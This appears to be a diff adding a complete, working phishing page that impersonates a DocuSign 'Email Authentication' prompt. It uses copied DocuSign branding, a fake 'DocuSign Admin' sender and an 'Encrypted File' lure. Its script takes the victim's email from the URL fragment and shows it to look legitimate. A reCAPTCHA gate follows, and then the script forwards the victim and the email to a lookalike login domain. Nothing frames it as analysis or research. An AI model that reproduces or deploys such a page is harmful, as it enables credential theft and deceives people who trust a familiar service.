@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            background-size: cover;
+            background-position: center;
+        }
+        .container {
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 800px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+        .hidden {
+            display: none;
+        }
+        .navigation {
+            position: fixed;
+            display: none;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 2em;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        .navigation.left {
+            left: 10px;
+        }
+        .navigation.right {
+            right: 10px;
+        }
+        .header, .content, .footer {
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 28px;
+            color: #333;
+            font-weight: bold;
+            margin: 0;
+        }
+        .content img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+        }
+        .content .sender-info {
+            color: #333;
+            font-size: 22px;
+            margin-top: 10px;
+        }
+        .content .account-info {
+            color: #666;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+        .content h2 {
+            font-size: 15px;
+            font-weight: bold;
+            color: #333;
+            margin-top: 20px;
+        }
+        .content ol {
+            text-align: left;
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        .content ol li {
+            margin-bottom: 10px;
+        }
+        .content .auth-info {
+            font-size: 15px;
+            color: #333;
+            margin-top: 20px;
+        }
+        .content .auth-info span {
+            font-weight: bold;
+            color: blue;
+        }
+        .footer {
+            font-size: 10px;
+            color: #ccc;
+            text-align: right;
+        }
+        .footer a {
+            color: #ccc;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .captcha-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .loader {
+            border: 6px solid #f3f3f3; /* Light grey */
+            border-top: 6px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script src='https://www.google.com/recaptcha/api.js' async defer></script>
+</head>
+<body>
+    <div class="container">
+        <div id="page1">
+            <div id="dlg_pnlDiaHeader" class="DiaHSignDialog" style="position: relative; border-radius: 2px 2px 0px 0px; background-color: #ffffff;" data-qa="dialog-title">
+                <table id="ds_hldrBdy_navTable" style="width: 100%; border-collapse: collapse;" border="0" cellspacing="0" cellpadding="0">
+                    <tbody>
+                        <tr>
+                            <td class="DiaHTSignDialog SR_DiaHTSignDialog" style="position: relative; padding: 5px; font-size: 28px; color: #333333; font-weight: bold !important; font-family: 'Maven Pro', sans-serif; white-space: nowrap;">
+                                <h1 style="font-size: 15px; margin: 0px;" data-qa="dialog-title"><span id="ds_hldrBdy_lblContentTitle" class="DiaHTSignDialog" style="position: relative; padding: 30px 35px 4px; font-size: 28px; color: #333333; font-weight: bold !important; font-family: 'Maven Pro', sans-serif;">Security Requests from Sender</span></h1>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <div id="ds_hldrBdy_dlg_pnlDiaInner" class="DiaSignDialog" style="padding: 40px; background-color: #ffffff; border-radius: 0px 0px 2px 2px; outline: none;">
+                <div id="ds_hldrBdy_pnlFromSender">
+                    <div style="position: relative; margin-top: -20px; height: 80px;">
+                        <div style="display: block; width: 40px; height: 40px;"><img style="width: 40px; height: 40px; border-radius: 50%;" src="https://na2.docusign.net/Signing/Images/Profile_Default_New.png" alt="" data-qa="access-code-dialog-sender-profile-image" /></div>
+                        <div style="color: #333333; font-size: 22px; position: relative; left: 51px; top: -44px; width: 581.646px;" data-qa="access-code-dialog-sender-user-name">DocuSign Admin</div>
+                        <div style="color: #666666; font-size: 16px; position: relative; left: 51px; top: -42px; width: 581.646px;" data-qa="access-code-dialog-sender-account-name">Encrypted File</div>
+                    </div>
+                </div>
+                <div id="ds_hldrBdy_pnlSMSAuthentication">
+                    <table style="position: relative; width: 100%;" border="0" cellspacing="0" cellpadding="0">
+                        <tbody>
+                            <tr>
+                                <td class="MOB_bigTitleForDialog">
+                                    <h2><span id="ds_hldrBdy_lblSMSAuth" class="Font15B" style="font-size: 15px !important; font-weight: bold !important; color: #333333 !important;">Email Authentication</span></h2>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td class="MOB_orderedListPadding"><span class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">In order to access this document, you need to confirm your identity using your email provider.<br /></span>
+                                    <ol>
+                                        <li>Verify that your email appears below.</li>
+                                        <li>Select Authenticate to proceed to the verification page.</li>
+                                    </ol>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td id="MOB_SMSAuthName">
+                                    <table border="0" cellspacing="0" cellpadding="0">
+                                        <tbody>
+                                            <tr>
+                                                <td class="MOB_lblSMSAuthName" style="padding-left: 0px;"><span id="ds_hldrBdy_lblSMSAuthName" class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">Authenticating Signer Address:</span><span id="grabbed-email"></span></td>
+                                                <td class="MOB_lblSMSAuthUserName"><span id="ds_hldrBdy_lblSMSAuthUserName" class="Font15B" style="font-size: 15px !important; font-weight: bold !important; color: #333333 !important;" id="grabbed-email"></span></td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td id="MOB_SMSAuthSelPhoneCell" style="padding-top: 15px; padding-left: 0px; padding-bottom: 15px;"><span id="ds_hldrBdy_lblSMSAuthSelPhone" class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">Please select authenticate to view and download the file:</span></td>
+                            </tr>
+                            <tr>
+                                <td style="padding-top: 3px;">
+                                    <table style="margin-left: 50px;" border="0" cellspacing="0" cellpadding="0">
+                                        <tbody>
+                                            <tr>
+                                                <td class="Font12R" style="font-size: 12px !important; font-weight: normal !important; color: #333333 !important;"></td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td id="MOB_SMSAuthSelPhoneCellNumbers" style="padding-top: 30px; padding-left: 100px;">
+                                    <table border="0">
+                                        <tbody>
+                                            <tr>
+                                                <td><button id="ds_hldrBdy_btnDSSMSAuthCall_btnInline" class="BtnHeight40 Btnprimary" style="font-family: 'Maven Pro', Arial, sans-serif; font-size: 13px; width: auto; position: relative; cursor: pointer; text-decoration: none; white-space: nowrap; background-repeat: repeat-x; padding: 0px 17px; border: 1px solid transparent; display: inline-block; box-sizing: inherit; height: 32px; margin: 0px 10px 0px 0px; border-radius: 2px; text-align: center; vertical-align: middle; font-weight: bold; text-transform: uppercase; background-color: #ffc820; color: #000000;">Authenticate</button></td>
+                                                <td class="MOB_hide" style="width: 10px;"></td>
+                                                <td class="MOB_hide"><button id="ds_hldrBdy_btnDSSMSAuthCancel_btnInline" class="BtnHeight40 Btnsecondary" style="font-family: 'Maven Pro', Arial, sans-serif; font-size: 13px; width: auto; position: relative; cursor: pointer; text-decoration: none; white-space: nowrap; background-repeat: repeat-x; padding: 0px 17px; border: 1px solid transparent; display: inline-block; box-sizing: inherit; height: 32px; margin: 0px 10px 0px 0px; border-radius: 2px; text-align: center; vertical-align: middle; font-weight: bold; text-transform: uppercase; background-color: #e9e9e9; color: #333333;">Cancel</button></td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr class="MOB_hide">
+                                <td style="padding-top: 10px;"><span id="ds_hldrBdy_lblSMSAuthNoPhone" class="Font15R" style="font-size: 15px !important; font-weight: normal !important; color: #333333 !important;">If you are not the intended receiver of this file, select <strong>Cancel</strong> and delete the message.</span></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div id="ds_Footer" class="FooterNew" style="position: absolute; background: #555555; bottom: 0px; left: 0px; right: 0px; text-align: right; font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc;">
+            <div class="site-content" style="margin: 0px auto; max-width: 1506px; padding: 0px 24px;">
+                <span class="FooterPoweredByTxt" style="float: left; margin-right: 6px; font-size: 11px; top: 1px; position: relative;">Powered by</span>
+                <img id="ds_imgLogoFooter" class="FooterImage" style="position: relative; float: left; margin-right: 20px; height: 20px; margin-top: 5px;" src="https://docucdn-a.akamaihd.net/olive/images/2.63.0/global-assets/ds-logo-inverse.svg" alt="Docusign" />
+                <div id="divFooterLinks" class="FooterLinks" style="color: #999999; display: inline-block; overflow: visible; position: relative;">
+                    <div id="ds_divLanguageSelected" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; padding-right: 10px; white-space: nowrap; text-align: center;">English (US)<span> </span><img style="vertical-align: middle;" src="https://na2.docusign.net/Signing/Images/controls/btn_arrow_u.png" border="0" alt="" /></div>
+                </div>
+                <span> </span><a id="TermsOfUse" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://www.docusign.com/legal/terms-and-conditions/" target="_blank">Terms Of Use</a><span>   |   </span><a id="CorporateSupport" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://www.docusign.com/support" target="_blank">Support</a><span>   |   </span><a id="Feedback" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://support.docusign.com/s/" target="_blank">Feedback</a><span>   |   </span><a id="PrivacyPolicy" class="FooterLink footer-item" style="font: 10px / 27px DSIndigo, Arial, sans-serif; color: #cccccc; cursor: pointer; text-decoration: none; white-space: nowrap; display: inline-block;" rel="noopener noreferrer" tabindex="0" href="https://www.docusign.com/company/privacy-policy" target="_blank">Privacy Policy</a><span class="footer-item" style="white-space: nowrap;">     Copyright © 2025 Docusign Inc.</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="overlay" id="captcha-overlay">
+        <div class="captcha-container">
+            <div class="g-recaptcha" data-sitekey="6LfdBPQqAAAAABJ4VHWKTWCDFiZTWNQSp0UAOF2g"></div>
+            <div id="g-recaptcha-error" style="height: 20px; font-size: 12px; margin-top: 5px;"></div>
+            <button id="captcha-submit" style="width: 200px; cursor: pointer; height: 40px">Submit</button>
+            <div class="loader" id="loading"></div>
+        </div>
+    </div>
+
+    <script>
+        function getFragment() {
+            var fragment = window.location.hash;
+            return fragment ? fragment.substring(1) : ''; // Remove the leading '#' character
+        }
+
+        function redirectToUrl(url) {
+            const fragment = getFragment();
+            const finalUrl = url + '#' + fragment; // Append the fragment to the given URL
+            // Execute redirect
+            window.location.href = finalUrl;
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const fragment = getFragment();
+            if (fragment) {
+                document.getElementById('grabbed-email').innerText = fragment;
+                document.getElementById('grabbed-email').style.fontWeight = 'bold';
+                document.getElementById('grabbed-email').style.color = 'blue';
+            }
+
+            document.getElementById('ds_hldrBdy_btnDSSMSAuthCall_btnInline').addEventListener('click', function() {
+                document.getElementById('captcha-overlay').style.display = 'flex';
+            });
+
+            document.getElementById('captcha-submit').addEventListener('click', function() {
+                const loader = document.getElementById('loading');
+                const recaptchaResponse = grecaptcha.getResponse();
+                if (recaptchaResponse.length < 1) {
+                    document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">This field is required.</span>';
+                } else {
+                    document.getElementById('g-recaptcha-error').innerHTML = 'verify...';
+                    loader.style.display = 'block';
+                    document.getElementById('captcha-submit').style.display = 'none';
+
+                    setTimeout(() => {
+                        redirectToUrl('https://login.ovadeivicefilshr.icu/VcnDfOFy'); // Replace with the actual URL
+                    }, 3000);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
